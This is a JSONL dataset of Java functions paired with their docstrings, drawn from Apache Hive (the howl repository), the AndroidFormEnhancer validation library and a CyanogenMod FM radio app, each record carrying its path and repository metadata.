{"docstring": "// returns true if there are elements in key list and any of them is null\n", "func_signal": "protected boolean hasAnyNulls(ArrayList<Object> key)", "code": "{\n  if (key != null && key.size() > 0) {\n    for (Object k : key) {\n      if (k == null) {\n        return true;\n      }\n    }\n  }\n  return false;\n}", "path": "ql\\src\\java\\org\\apache\\hadoop\\hive\\ql\\exec\\AbstractMapJoinOperator.java", "repo_name": "YahooArchive/howl", "stars": 78, "license": "apache-2.0", "language": "java", "size": 59040}
{"docstring": "/**\n * Return the field based on the tag value associated with the Object.\n */\n", "func_signal": "public Object getField(Object o)", "code": "{\n  if (o == null) {\n    return null;\n  }\n  return ((UnionObject) o).getObject();\n}", "path": "serde\\src\\java\\org\\apache\\hadoop\\hive\\serde2\\objectinspector\\StandardUnionObjectInspector.java", "repo_name": "YahooArchive/howl", "stars": 78, "license": "apache-2.0", "language": "java", "size": 59040}
{"docstring": "/**\n * Return the tag of the object.\n */\n", "func_signal": "public byte getTag(Object o)", "code": "{\n  if (o == null) {\n    return -1;\n  }\n  return ((UnionObject) o).getTag();\n}", "path": "serde\\src\\java\\org\\apache\\hadoop\\hive\\serde2\\objectinspector\\StandardUnionObjectInspector.java", "repo_name": "YahooArchive/howl", "stars": 78, "license": "apache-2.0", "language": "java", "size": 59040}
{"docstring": "/**\n * @param dbName\n *          database to add to.\n * @param tableName\n *          table to add to.\n * @param partSpec\n *          partition specification.\n * @param location\n *          partition location, relative to table location.\n * @param ifNotExists \n *          if true, the partition is only added if it doesn't exist\n */\n", "func_signal": "public AddPartitionDesc(String dbName, String tableName,\n    Map<String, String> partSpec, String location, boolean ifNotExists)", "code": "{\n  super();\n  this.dbName = dbName;\n  this.tableName = tableName;\n  this.partSpec = new LinkedHashMap<String,String>(partSpec);\n  this.location = location;\n  this.ifNotExists = ifNotExists;\n}", "path": "ql\\src\\java\\org\\apache\\hadoop\\hive\\ql\\plan\\AddPartitionDesc.java", "repo_name": "YahooArchive/howl", "stars": 78, "license": "apache-2.0", "language": "java", "size": 59040}
{"docstring": "/** Returns true if field corresponding to fieldID is set (has been asigned a value) and false otherwise */\n", "func_signal": "public boolean isSet(_Fields field)", "code": "{\n  if (field == null) {\n    throw new IllegalArgumentException();\n  }\n\n  switch (field) {\n  case MESSAGE:\n    return isSetMessage();\n  }\n  throw new IllegalStateException();\n}", "path": "metastore\\src\\gen\\thrift\\gen-javabean\\org\\apache\\hadoop\\hive\\metastore\\api\\InvalidObjectException.java", "repo_name": "YahooArchive/howl", "stars": 78, "license": "apache-2.0", "language": "java", "size": 59040}
{"docstring": "/**\n * @param arguments\n *          argument 0 is the JDBC connection string argument 1 is the user\n *          name argument 2 is the password argument 3 is an SQL query to be\n *          used in the PreparedStatement argument (4-n) The remaining\n *          arguments must be primitive and are passed to the\n *          PreparedStatement object\n */\n", "func_signal": "@Override\npublic ObjectInspector initialize(ObjectInspector[] arguments)\n    throws UDFArgumentTypeException", "code": "{\n  argumentOI = arguments;\n\n  // this should be connection url,username,password,query,column1[,columnn]*\n  for (int i = 0; i < 4; i++) {\n    if (arguments[i].getCategory() == ObjectInspector.Category.PRIMITIVE) {\n      PrimitiveObjectInspector poi = ((PrimitiveObjectInspector) arguments[i]);\n\n      if (!(poi.getPrimitiveCategory() == PrimitiveObjectInspector.PrimitiveCategory.STRING)) {\n        throw new UDFArgumentTypeException(i,\n            \"The argument of function  should be \\\"\"\n            + Constants.STRING_TYPE_NAME + \"\\\", but \\\"\"\n            + arguments[i].getTypeName() + \"\\\" is found\");\n      }\n    }\n  }\n  for (int i = 4; i < arguments.length; i++) {\n    if (arguments[i].getCategory() != ObjectInspector.Category.PRIMITIVE) {\n      throw new UDFArgumentTypeException(i,\n          \"The argument of function should be primative\" + \", but \\\"\"\n          + arguments[i].getTypeName() + \"\\\" is found\");\n    }\n  }\n\n  return PrimitiveObjectInspectorFactory.writableIntObjectInspector;\n}", "path": "contrib\\src\\java\\org\\apache\\hadoop\\hive\\contrib\\genericudf\\example\\GenericUDFDBOutput.java", "repo_name": "YahooArchive/howl", "stars": 78, "license": "apache-2.0", "language": "java", "size": 59040}
{"docstring": "/**\n * Validates TextView or EditText.<br>\n * For example, you can call this inside\n * {@linkplain android.view.View.OnFocusChangeListener}.\n *\n * @param textViewId target TextView or EditText's resource ID\n */\n", "func_signal": "public void validateText(final int textViewId)", "code": "{\n    getValidationManager().extractFormFromView(mRootView);\n    ValidationResult result = getValidationManager().validate(textViewId);\n    TextView v = (TextView) mRootView.findViewById(textViewId);\n    setErrorToTextView(result, v);\n}", "path": "androidformenhancer\\src\\com\\androidformenhancer\\helper\\FormHelper.java", "repo_name": "ksoichiro/AndroidFormEnhancer", "stars": 74, "license": "apache-2.0", "language": "java", "size": 2333}
{"docstring": "/**\n * Represents the value of the field must have digits less than or equals to the\n * number specified by {@link #value()}.\n * <p/>\n * This annotation resembles to the {@linkplain MaxLength}, but this does not\n * treat as an error if the value includes non-digit character even though its\n * length does not match {@linkplain #value()}. Use {@linkplain Digits} together\n * if you want to validate whether the characters in the value are only digits.\n * <p/>\n * If you want to disallow length less than {@link #value()}, use\n * {@linkplain NumOfDigits} instead.\n *\n * @author Soichiro Kashima\n * @see Digits\n * @see NumOfDigits\n * @see MaxLength\n */\n", "func_signal": "@Target(ElementType.FIELD)\n@Retention(RetentionPolicy.RUNTIME)\npublic @interface MaxNumOfDigits", "code": "{\n    /**\n     * Resource ID of the field name for the error message.<br>\n     * This is set to {@code 0}(invalid) as default, and the field name will be\n     * used in the error messages.\n     */\n    int nameResId() default 0;\n\n    /**\n     * Max number of the digits of the field.\n     */\n    int value();\n}", "path": "androidformenhancer\\src\\com\\androidformenhancer\\annotation\\MaxNumOfDigits.java", "repo_name": "ksoichiro/AndroidFormEnhancer", "stars": 74, "license": "apache-2.0", "language": "java", "size": 2333}
{"docstring": "/**\n * Sets the {@linkplain android.view.View.OnFocusChangeListener} to\n * validate on focus out.<br>\n * If you want to implement your own\n * {@linkplain android.view.View.OnFocusChangeListener}, use\n * {@linkplain #validateText(int)}.\n */\n", "func_signal": "public void setOnFocusOutValidation()", "code": "{\n    getValidationManager().extractFormFromView(mRootView);\n    for (final int id : getValidationManager().getExtractedWidgetIds()) {\n        WidgetType widgetType = getValidationManager().getFieldData(id).getWidgetType();\n        if (widgetType != WidgetType.TEXT) {\n            continue;\n        }\n        final EditText e = (EditText) mRootView.findViewById(id);\n        e.setOnFocusChangeListener(new View.OnFocusChangeListener() {\n            @Override\n            public void onFocusChange(View v, boolean hasFocus) {\n                if (!hasFocus) {\n                    getValidationManager().extractFormFromView(mRootView);\n                    ValidationResult result = getValidationManager().validate(id);\n                    setErrorToTextView(result, e);\n                }\n            }\n        });\n    }\n}", "path": "androidformenhancer\\src\\com\\androidformenhancer\\helper\\FormHelper.java", "repo_name": "ksoichiro/AndroidFormEnhancer", "stars": 74, "license": "apache-2.0", "language": "java", "size": 2333}
{"docstring": "/**\n * Represents the value of the field must be in the integer range.\n *\n * @author Soichiro Kashima\n */\n", "func_signal": "@Target(ElementType.FIELD)\n@Retention(RetentionPolicy.RUNTIME)\npublic @interface IntRange", "code": "{\n    /**\n     * Resource ID of the field name for the error message.<br>\n     * This is set to {@code 0}(invalid) as default, and the field name will be\n     * used in the error messages.\n     */\n    int nameResId() default 0;\n\n    /**\n     * Minimum value of the field.\n     */\n    int min();\n\n    /**\n     * Maximum value of the field.\n     */\n    int max();\n}", "path": "androidformenhancer\\src\\com\\androidformenhancer\\annotation\\IntRange.java", "repo_name": "ksoichiro/AndroidFormEnhancer", "stars": 74, "license": "apache-2.0", "language": "java", "size": 2333}
{"docstring": "/**\n * Represents the value of the field must have the number of the digits\n * specified by {@link #value()}.\n * <p/>\n * This annotation resembles to the {@linkplain Length}, but this does not treat\n * as an error if the value includes non-digit character even though its length\n * does not match {@linkplain #value()}. Use {@linkplain Digits} together if you\n * want to validate whether the characters in the value are only digits.\n * <p/>\n * If you want to allow length less than {@link #value()}, use\n * {@linkplain MaxNumOfDigits} instead.\n *\n * @author Soichiro Kashima\n * @see Digits\n * @see MaxNumOfDigits\n * @see Length\n */\n", "func_signal": "@Target(ElementType.FIELD)\n@Retention(RetentionPolicy.RUNTIME)\npublic @interface NumOfDigits", "code": "{\n    /**\n     * Resource ID of the field name for the error message.<br>\n     * This is set to {@code 0}(invalid) as default, and the field name will be\n     * used in the error messages.\n     */\n    int nameResId() default 0;\n\n    /**\n     * Number of the digits of the field.\n     */\n    int value();\n}", "path": "androidformenhancer\\src\\com\\androidformenhancer\\annotation\\NumOfDigits.java", "repo_name": "ksoichiro/AndroidFormEnhancer", "stars": 74, "license": "apache-2.0", "language": "java", "size": 2333}
{"docstring": "/**\n * Sets the error icon and popup window to the specified TextView or\n * EditText.<br>\n * Before calling this, you must call {@linkplain #validate()} or\n * {@linkplain #validateText(int)} to get validation result.\n *\n * @param result   validation result\n * @param textView TextView or EditText object which you want to set error\n */\n", "func_signal": "public void setErrorToTextView(final ValidationResult result, final TextView textView)", "code": "{\n    if (mValidationErrorIconEnabled) {\n        int id = textView.getId();\n        if (result.hasErrorFor(id)) {\n            textView.setError(StringUtils.serialize(result.getErrorsFor(id)),\n                    mIconError);\n            textView.setCompoundDrawables(null, null, mIconError, null);\n        } else {\n            textView.setCompoundDrawables(null, null, mIconOk, null);\n        }\n    }\n}", "path": "androidformenhancer\\src\\com\\androidformenhancer\\helper\\FormHelper.java", "repo_name": "ksoichiro/AndroidFormEnhancer", "stars": 74, "license": "apache-2.0", "language": "java", "size": 2333}
{"docstring": "/**\n * Returns the extracted form.<br>\n * The form returned is deep copy, so values of this object's fields cannot\n * be changed from inside the FormHelper.\n *\n * @return deep copy of the extracted form\n */\n", "func_signal": "public Object getForm()", "code": "{\n    if (mForm == null || mFormClass == null) {\n        throw new IllegalStateException(\"Form is not initialized or validated.\");\n    }\n\n    try {\n        Object form = mFormClass.newInstance();\n        for (Field field : mFormClass.getFields()) {\n            // We do not copy non-widget field\n            if (field.getAnnotation(Widget.class) == null) {\n                continue;\n            }\n\n            // Ignore null field\n            Object value = field.get(mForm);\n            if (value == null) {\n                continue;\n            }\n\n            // Allows only String and List<String> fields\n            Class<?> type = field.getType();\n            if (type.equals(List.class)) {\n                @SuppressWarnings(\"unchecked\")\n                List<String> srcList = (List<String>) value;\n                List<String> dstList = new ArrayList<String>();\n                for (String srcValue : srcList) {\n                    dstList.add(srcValue);\n                }\n                field.set(form, dstList);\n            } else if (type.equals(String.class)) {\n                field.set(form, field.get(mForm));\n            } else {\n                throw new IllegalStateException(\n                        \"Form class can have only String and List<String> fields but \"\n                                + type + \" found.\"\n                );\n            }\n        }\n        return form;\n    } catch (InstantiationException e) {\n        Log.v(TAG, \"Failed to copy form.\", e);\n    } catch (IllegalAccessException e) {\n        e.printStackTrace();\n    }\n    return null;\n}", "path": "androidformenhancer\\src\\com\\androidformenhancer\\internal\\ValidationManager.java", "repo_name": "ksoichiro/AndroidFormEnhancer", "stars": 74, "license": "apache-2.0", "language": "java", "size": 2333}
{"docstring": "/**\n * Constructor. You must specify the Form class representing widget details\n * and validation specifications.\n *\n * @param clazz    class of the form\n * @param activity activity which create this object\n */\n", "func_signal": "public ActivityFormHelper(final Class<?> clazz, final Activity activity)", "code": "{\n    super(clazz, activity);\n    mNormalActivity = activity;\n    setRootView(activity.getWindow().getDecorView().findViewById(android.R.id.content));\n    init();\n}", "path": "androidformenhancer\\src\\com\\androidformenhancer\\helper\\ActivityFormHelper.java", "repo_name": "ksoichiro/AndroidFormEnhancer", "stars": 74, "license": "apache-2.0", "language": "java", "size": 2333}
{"docstring": "/**\n * Gets the resource IDs of the fields extracted by\n * {@linkplain #extractFormFromView(View)}.\n *\n * @return set of the resource IDs\n */\n", "func_signal": "public Set<Integer> getExtractedWidgetIds()", "code": "{\n    Set<Integer> ids = new HashSet<Integer>();\n    for (int i = 0; i < mFieldDataArray.size(); i++) {\n        ids.add(mFieldDataArray.keyAt(i));\n    }\n    return ids;\n}", "path": "androidformenhancer\\src\\com\\androidformenhancer\\internal\\ValidationManager.java", "repo_name": "ksoichiro/AndroidFormEnhancer", "stars": 74, "license": "apache-2.0", "language": "java", "size": 2333}
{"docstring": "/**\n * Sets the icon of the success for the EditText.\n *\n * @param resId resource ID for icon drawable\n */\n", "func_signal": "public void setIconOk(final int resId)", "code": "{\n    mIconOk = mContext.getResources().getDrawable(resId);\n    setDrawableIntrinsicBounds(mIconOk);\n}", "path": "androidformenhancer\\src\\com\\androidformenhancer\\helper\\FormHelper.java", "repo_name": "ksoichiro/AndroidFormEnhancer", "stars": 74, "license": "apache-2.0", "language": "java", "size": 2333}
{"docstring": "/**\n * Convenience for showAlertDialog(Context#getString(titleResId),\n * Context#getString(messageResId), cancelable)}.\n *\n * @param messageResId message resource ID\n * @throws IllegalStateException if FragmentActivity instance has not been\n *                               passed to this instance\n * @see #showAlertDialog(int, int, boolean)\n */\n", "func_signal": "public void showAlertDialog(final int titleResId, final int messageResId,\n                            final boolean cancelable)", "code": "{\n    showAlertDialog(mContext.getString(titleResId), mContext.getString(messageResId),\n            cancelable);\n}", "path": "androidformenhancer\\src\\com\\androidformenhancer\\helper\\FormHelper.java", "repo_name": "ksoichiro/AndroidFormEnhancer", "stars": 74, "license": "apache-2.0", "language": "java", "size": 2333}
{"docstring": "/**\n * Sets the icon of the success for the EditText.\n *\n * @param d Drawable object for icon\n */\n", "func_signal": "public void setIconOk(final Drawable d)", "code": "{\n    mIconOk = d;\n    setDrawableIntrinsicBounds(mIconOk);\n}", "path": "androidformenhancer\\src\\com\\androidformenhancer\\helper\\FormHelper.java", "repo_name": "ksoichiro/AndroidFormEnhancer", "stars": 74, "license": "apache-2.0", "language": "java", "size": 2333}
{"docstring": "/**\n * Reads the form information from the form, and creates a new object.\n *\n * @param rootView root view of the form\n */\n", "func_signal": "public void extractFormFromView(final View rootView)", "code": "{\n    ensureFormFieldsTypes();\n\n    try {\n        mForm = mFormClass.newInstance();\n        mFieldDataArray = new SparseArray<FieldData>();\n        final Field[] fields = mFormClass.getFields();\n        for (Field field : fields) {\n            Widget widget = field.getAnnotation(Widget.class);\n            if (widget == null) {\n                continue;\n            }\n            View view = rootView.findViewById(widget.id());\n            if (view instanceof EditText) {\n                String value = ((EditText) view).getText().toString();\n                field.set(mForm, value);\n                addFormMetaData(field, WidgetType.TEXT, value);\n                continue;\n            }\n            if (view instanceof RadioGroup) {\n                RadioGroup radioGroup = (RadioGroup) view;\n                int checkedId = radioGroup.getCheckedRadioButtonId();\n                WidgetValue[] values = widget.values();\n                String value = null;\n                for (int i = 0; i < values.length; i++) {\n                    if (values[i].id() == checkedId) {\n                        field.set(mForm, values[i].value());\n                        value = values[i].value();\n                        break;\n                    }\n                }\n                addFormMetaData(field, WidgetType.RADIO, value);\n                continue;\n            }\n            if (view instanceof Spinner) {\n                int index = ((Spinner) view).getSelectedItemPosition();\n                field.set(mForm, Integer.toString(index));\n                addFormMetaData(field, WidgetType.SPINNER, Integer.toString(index));\n                continue;\n            }\n            if (view instanceof ViewGroup) {\n                ViewGroup group = (ViewGroup) view;\n                List<String> checkedValues = new ArrayList<String>();\n                if (widget.values() != null && widget.values().length > 0) {\n                    for (WidgetValue checkBoxValue : widget.values()) {\n                        CheckBox cb = (CheckBox) group.findViewById(checkBoxValue.id());\n                        if (cb != null && cb.isChecked()) {\n                            checkedValues.add(checkBoxValue.value());\n                        }\n                    }\n                } else {\n                    List<CheckBox> cbs = findCheckboxes(group);\n                    for (CheckBox cb : cbs) {\n                        if (cb != null && cb.isChecked() && cb.getTag() != null) {\n                            Object tag = cb.getTag();\n                            checkedValues.add(tag.toString());\n                        }\n                    }\n                }\n                field.set(mForm, checkedValues);\n                addFormMetaData(field, WidgetType.CHECKBOX, checkedValues);\n                continue;\n            }\n        }\n    } catch (Exception e) {\n        mForm = null;\n        Log.v(TAG, e.getMessage(), e);\n        throw new RuntimeException(\"Failed to create form instance or retrive data.\", e);\n    }\n}", "path": "androidformenhancer\\src\\com\\androidformenhancer\\internal\\ValidationManager.java", "repo_name": "ksoichiro/AndroidFormEnhancer", "stars": 74, "license": "apache-2.0", "language": "java", "size": 2333}
{"docstring": "/**\n * Represents the value of the field must have digits less than or equals to the\n * number specified by {@link #value()}.\n * <p/>\n * This annotation resembles to the {@linkplain MaxNumOfDigits}, but this does\n * treat as an error if the value includes non-digit character.\n * <p/>\n * If you want to disallow length less than {@link #value()}, use\n * {@linkplain Length} instead.\n *\n * @author Soichiro Kashima\n * @see Length\n * @see MaxNumOfDigits\n */\n", "func_signal": "@Target(ElementType.FIELD)\n@Retention(RetentionPolicy.RUNTIME)\npublic @interface MaxLength", "code": "{\n    /**\n     * Resource ID of the field name for the error message.<br>\n     * This is set to {@code 0}(invalid) as default, and the field name will be\n     * used in the error messages.\n     */\n    int nameResId() default 0;\n\n    /**\n     * Max length of the field.\n     */\n    int value();\n}", "path": "androidformenhancer\\src\\com\\androidformenhancer\\annotation\\MaxLength.java", "repo_name": "ksoichiro/AndroidFormEnhancer", "stars": 74, "license": "apache-2.0", "language": "java", "size": 2333}
{"docstring": "/**\n * Copies an object fields which have same names as the form class.\n *\n * @param clazz the entity class to create\n * @return created entity object\n */\n", "func_signal": "public <E> E create(final Class<E> clazz)", "code": "{\n    Field[] srcFields = mForm.getClass().getFields();\n\n    try {\n        E dst = clazz.newInstance();\n        for (Field srcField : srcFields) {\n            Object value = srcField.get(mForm);\n            if (value == null) {\n                continue;\n            }\n            String name = srcField.getName();\n            Field dstField = clazz.getField(name);\n            Class<?> dstType = dstField.getType();\n            if (dstType.equals(List.class)) {\n                @SuppressWarnings(\"unchecked\")\n                List<String> srcList = (List<String>) value;\n                List<String> dstList = new ArrayList<String>();\n                for (String srcValue : srcList) {\n                    dstList.add(srcValue);\n                }\n                dstField.set(dst, dstList);\n            } else {\n                String valueString = (String) value;\n                if (valueString.length() == 0) {\n                    continue;\n                }\n                if (dstType.equals(String.class)) {\n                    dstField.set(dst, valueString);\n                } else if (dstType.equals(int.class)) {\n                    dstField.setInt(dst, Integer.parseInt(valueString));\n                } else if (dstType.equals(float.class)) {\n                    dstField.setFloat(dst, Float.parseFloat(valueString));\n                } else if (dstType.equals(double.class)) {\n                    dstField.setDouble(dst, Double.parseDouble(valueString));\n                } else if (dstType.equals(boolean.class)) {\n                    dstField.setBoolean(dst, Boolean.parseBoolean(valueString));\n                } else if (dstType.equals(long.class)) {\n                    dstField.setLong(dst, Long.parseLong(valueString));\n                } else if (dstType.equals(short.class)) {\n                    dstField.setShort(dst, Short.parseShort(valueString));\n                } else if (dstType.equals(char.class)) {\n                    dstField.setChar(dst, valueString.charAt(0));\n                } else {\n                    throw new IllegalArgumentException(\n                            \"Entity field types must be primitive types or String or List<String>: \"\n                                    + dstType.getCanonicalName()\n                    );\n                }\n            }\n        }\n        return dst;\n    } catch (Exception e) {\n        Log.v(TAG, e.getMessage(), e);\n        throw new RuntimeException(\"Failed to instantiate entity.\", e);\n    }\n}", "path": "androidformenhancer\\src\\com\\androidformenhancer\\internal\\ValidationManager.java", "repo_name": "ksoichiro/AndroidFormEnhancer", "stars": 74, "license": "apache-2.0", "language": "java", "size": 2333}
{"docstring": "/**\n * Constructor.\n *\n * @param context   context\n * @param formClass POJO form class which has information of the form\n */\n", "func_signal": "public ValidationManager(final Context context, final Class<?> formClass)", "code": "{\n    mValidators = new ArrayList<Validator<?>>();\n    mStopPolicy = STOP_POLICY_CONTINUE_ALL;\n    mFormClass = formClass;\n    init(context);\n}", "path": "androidformenhancer\\src\\com\\androidformenhancer\\internal\\ValidationManager.java", "repo_name": "ksoichiro/AndroidFormEnhancer", "stars": 74, "license": "apache-2.0", "language": "java", "size": 2333}
{"docstring": "/**\n * Sets the icon of the error for the EditText.\n *\n * @param d Drawable object for icon\n */\n", "func_signal": "public void setIconError(final Drawable d)", "code": "{\n    mIconError = d;\n    setDrawableIntrinsicBounds(mIconError);\n}", "path": "androidformenhancer\\src\\com\\androidformenhancer\\helper\\FormHelper.java", "repo_name": "ksoichiro/AndroidFormEnhancer", "stars": 74, "license": "apache-2.0", "language": "java", "size": 2333}
{"docstring": "/**\n * Represents the value of the field must have length specified by\n * {@link #value()}.\n * <p/>\n * This annotation resembles to the {@linkplain NumOfDigits}, but this does\n * treat as an error if the value includes non-digit character.\n * <p/>\n * If you want to allow length less than {@link #value()}, use\n * {@linkplain MaxLength} instead.\n *\n * @author Soichiro Kashima\n * @see MaxLength\n * @see NumOfDigits\n */\n", "func_signal": "@Target(ElementType.FIELD)\n@Retention(RetentionPolicy.RUNTIME)\npublic @interface Length", "code": "{\n    /**\n     * Resource ID of the field name for the error message.<br>\n     * This is set to {@code 0}(invalid) as default, and the field name will be\n     * used in the error messages.\n     */\n    int nameResId() default 0;\n\n    /**\n     * Length of the field.\n     */\n    int value();\n}", "path": "androidformenhancer\\src\\com\\androidformenhancer\\annotation\\Length.java", "repo_name": "ksoichiro/AndroidFormEnhancer", "stars": 74, "license": "apache-2.0", "language": "java", "size": 2333}
{"docstring": "/**\n * Represents the value of the field must match the regular expression.\n *\n * @author Soichiro Kashima\n */\n", "func_signal": "@Target(ElementType.FIELD)\n@Retention(RetentionPolicy.RUNTIME)\npublic @interface Regex", "code": "{\n    /**\n     * Resource ID of the field name for the error message.<br>\n     * This is set to {@code 0}(invalid) as default, and the field name will be\n     * used in the error messages.\n     */\n    int nameResId() default 0;\n\n    /**\n     * Regular expression for the field.\n     */\n    String value();\n}", "path": "androidformenhancer\\src\\com\\androidformenhancer\\annotation\\Regex.java", "repo_name": "ksoichiro/AndroidFormEnhancer", "stars": 74, "license": "apache-2.0", "language": "java", "size": 2333}
{"docstring": "/**\n * Sets the icon of the error for the EditText.\n *\n * @param resId resource ID for icon drawable\n */\n", "func_signal": "public void setIconError(final int resId)", "code": "{\n    mIconError = mContext.getResources().getDrawable(resId);\n    setDrawableIntrinsicBounds(mIconError);\n}", "path": "androidformenhancer\\src\\com\\androidformenhancer\\helper\\FormHelper.java", "repo_name": "ksoichiro/AndroidFormEnhancer", "stars": 74, "license": "apache-2.0", "language": "java", "size": 2333}
{"docstring": "/**\n * Get the Text String for the Program type Code\n */\n", "func_signal": "public static String parsePTY(int pty)", "code": "{\n    String ptyStr = \"\";\n    int rdsStd = FmSharedPreferences.getFMConfiguration().getRdsStd();\n    if (rdsStd == FmReceiver.FM_RDS_STD_RBDS) {\n        ptyStr = getRBDSPtyString(pty);\n    } else if (rdsStd == FmReceiver.FM_RDS_STD_RDS) {\n        ptyStr = getRDSPtyString(pty);\n    }\n    return (ptyStr);\n}", "path": "src\\com\\android\\fm\\radio\\PresetStation.java", "repo_name": "CyanogenMod/android_packages_apps_FM", "stars": 85, "license": "None", "language": "java", "size": 2109}
{"docstring": "/** Does \"station\" already exist in the Preset List indexed by \"listIndex\" */\n", "func_signal": "public static boolean sameStationExists(int listIndex, PresetStation station)", "code": "{\n    boolean exists = false;\n    if (getNumList() > listIndex) {\n        exists = mListOfPlists.get(listIndex).sameStationExists(station);\n    }\n    return exists;\n}", "path": "src\\com\\android\\fm\\radio\\FmSharedPreferences.java", "repo_name": "CyanogenMod/android_packages_apps_FM", "stars": 85, "license": "None", "language": "java", "size": 2109}
{"docstring": "/**\n */\n", "func_signal": "public FrequencyPickerDialog(Context context, int theme, FmConfig fmConfig, int frequency,\n        OnFrequencySetListener callback)", "code": "{\n    super(context, theme);\n    mMinFrequency = fmConfig.getLowerLimit();\n    mMaxFrequency = fmConfig.getUpperLimit();\n    mChannelSpacing = 200;\n    if (FmReceiver.FM_CHSPACE_200_KHZ == fmConfig.getChSpacing()) {\n        mChannelSpacing = 200;\n    } else if (FmReceiver.FM_CHSPACE_100_KHZ == fmConfig.getChSpacing()) {\n        mChannelSpacing = 100;\n    } else if (FmReceiver.FM_CHSPACE_50_KHZ == fmConfig.getChSpacing()) {\n        mChannelSpacing = 50;\n    }\n    String frequencyString = getContext().getString(R.string.stat_notif_frequency,\n            FrequencyPicker.formatFrequencyString(frequency));\n    setTitle(frequencyString);\n    mCallBack = callback;\n\n    setButton(context.getString(R.string.alert_dialog_ok), this);\n    setButton2(context.getString(R.string.alert_dialog_cancel), (OnClickListener) null);\n\n    LayoutInflater inflater = (LayoutInflater) context\n            .getSystemService(Context.LAYOUT_INFLATER_SERVICE);\n    View view = inflater.inflate(R.layout.frequency_picker_dialog, null);\n    setView(view);\n    mFrequencyPicker = (FrequencyPicker) view.findViewById(R.id.frequencyPicker);\n    if (mFrequencyPicker != null) {\n        mFrequencyPicker.init(mMinFrequency, mMaxFrequency, mChannelSpacing, frequency, this);\n    } else {\n        Log.e(\"fmRadio\", \"Failed to find ID: R.id.frequencyPicker\");\n    }\n}", "path": "src\\com\\android\\fm\\utils\\FrequencyPickerDialog.java", "repo_name": "CyanogenMod/android_packages_apps_FM", "stars": 85, "license": "None", "language": "java", "size": 2109}
{"docstring": "/** Does \"station\" already exist in the current Preset List */\n", "func_signal": "public static boolean sameStationExists(PresetStation station)", "code": "{\n    int listIndex = getCurrentListIndex();\n    boolean exists = false;\n    if (getNumList() > listIndex) {\n        exists = mListOfPlists.get(listIndex).sameStationExists(station);\n    }\n    return exists;\n}", "path": "src\\com\\android\\fm\\radio\\FmSharedPreferences.java", "repo_name": "CyanogenMod/android_packages_apps_FM", "stars": 85, "license": "None", "language": "java", "size": 2109}
{"docstring": "/** Does \"station\" already exist in the current Preset List */\n", "func_signal": "public static int getListStationCount()", "code": "{\n    int listIndex = getCurrentListIndex();\n    int numStations = 0;\n    if (getNumList() > listIndex) {\n        numStations = mListOfPlists.get(listIndex).getStationCount();\n    }\n    return numStations;\n}", "path": "src\\com\\android\\fm\\radio\\FmSharedPreferences.java", "repo_name": "CyanogenMod/android_packages_apps_FM", "stars": 85, "license": "None", "language": "java", "size": 2109}
{"docstring": "/**\n * Resets the scroll to display the original string.\n */\n", "func_signal": "private void resetScroll()", "code": "{\n    mIteration = 0;\n    final TextView textView = mView.get();\n    if (textView != null) {\n        textView.setText(mOriginalString);\n    }\n}", "path": "src\\com\\android\\fm\\radio\\FMRadio.java", "repo_name": "CyanogenMod/android_packages_apps_FM", "stars": 85, "license": "None", "language": "java", "size": 2109}
{"docstring": "/** Called when the activity is first created. */\n", "func_signal": "@Override\npublic void onCreate(Bundle savedInstanceState)", "code": "{\n\n    super.onCreate(savedInstanceState);\n\n    mPrefs = new FmSharedPreferences(this);\n    mPrefs.Load();\n    mCommandActive = CMD_NONE;\n    mCommandFailed = CMD_NONE;\n\n    Log.d(LOGTAG, \"onCreate - Height : \" + getWindowManager().getDefaultDisplay().getHeight()\n            + \" - Width  : \" + getWindowManager().getDefaultDisplay().getWidth());\n\n    requestWindowFeature(Window.FEATURE_NO_TITLE);\n    setContentView(R.layout.fmradio);\n\n    mOnOffButton = (ImageButton) findViewById(R.id.btn_onoff);\n    mOnOffButton.setOnClickListener(mTurnOnOffClickListener);\n\n    mSpeakerButton = (ImageButton) findViewById(R.id.btn_speaker);\n    mSpeakerButton.setOnClickListener(mSpeakerSwitchClickListener);\n\n    /* 5 Preset Buttons */\n    mPresetButtons[0] = (Button) findViewById(R.id.presets_button_1);\n    mPresetButtons[1] = (Button) findViewById(R.id.presets_button_2);\n    mPresetButtons[2] = (Button) findViewById(R.id.presets_button_3);\n    mPresetButtons[3] = (Button) findViewById(R.id.presets_button_4);\n    mPresetButtons[4] = (Button) findViewById(R.id.presets_button_5);\n    for (int nButton = 0; nButton < MAX_PRESETS_PER_PAGE; nButton++) {\n        mPresetButtons[nButton].setOnClickListener(mPresetButtonClickListener);\n        mPresetButtons[nButton].setOnLongClickListener(mPresetButtonOnLongClickListener);\n    }\n\n    mTuneStationFrequencyTV = (TextView) findViewById(R.id.prog_frequency_tv);\n    if (mTuneStationFrequencyTV != null) {\n        mTuneStationFrequencyTV.setOnClickListener(mFrequencyViewClickListener);\n    }\n\n    mFreqIndicator = (FreqIndicator) findViewById(R.id.freq_indicator_view);\n    mFreqIndicator.setMax(FmSharedPreferences.getUpperLimit() - FmSharedPreferences.getLowerLimit());\n    mFreqIndicator.setMinFrequency(FmSharedPreferences.getLowerLimit());\n    mFrequencyIndicatorChangeListener = new SeekBarChangeListener();\n    mFrequencyIndicatorChangeListener.setMin(mFreqIndicator.getMinFrequency());\n    mFreqIndicator.setOnSeekBarChangeListener(mFrequencyIndicatorChangeListener);\n\n    mTunerView = (TunerView) findViewById(R.id.fm_tuner_view);\n    mTunerView.setOnMoveListener(mTunerViewMoveListener);\n\n    IntentFilter filter = new IntentFilter();\n    filter.addAction(BluetoothAdapter.ACTION_STATE_CHANGED);\n    registerReceiver(mIntentReceiver, filter);\n\n    enableRadioOnOffUI(false);\n\n    if (false == bindToService(this, osc)) {\n        Log.d(LOGTAG, \"onCreate: Failed to Start Service\");\n    } else {\n        Log.d(LOGTAG, \"onCreate: Start Service completed successfully\");\n    }\n}", "path": "src\\com\\android\\fm\\radio\\FMRadio.java", "repo_name": "CyanogenMod/android_packages_apps_FM", "stars": 85, "license": "None", "language": "java", "size": 2109}
